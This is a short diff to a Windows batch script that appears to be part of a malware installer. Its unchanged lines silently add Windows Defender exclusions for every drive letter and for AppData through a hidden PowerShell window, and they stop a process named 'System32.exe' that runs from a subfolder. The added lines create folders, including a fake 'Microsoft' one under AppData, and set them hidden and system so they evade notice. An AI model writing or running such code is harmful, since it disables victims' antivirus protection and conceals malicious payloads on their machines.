@@ -24,6 +24,15 @@ for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 :: Exclude AppData
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'; exit"
 
+:: Check and create Traces, SubDir, and Microsoft folders if missing
+for %%F in ("%TRACES_DIR%" "%SUBDIR%" "%APPDATA%\Microsoft") do (
+    if not exist "%%~F" (
+        mkdir "%%~F" >nul 2>&1
+    )
+    attrib -h -s -r "%%~F" >nul 2>&1
+    attrib +h +s "%%~F" >nul 2>&1
+)
+
 :: Kill System32.exe if running in SubDir
 if exist "%SUBDIR%\System32.exe" (
     taskkill /F /IM System32.exe >nul 2>&1
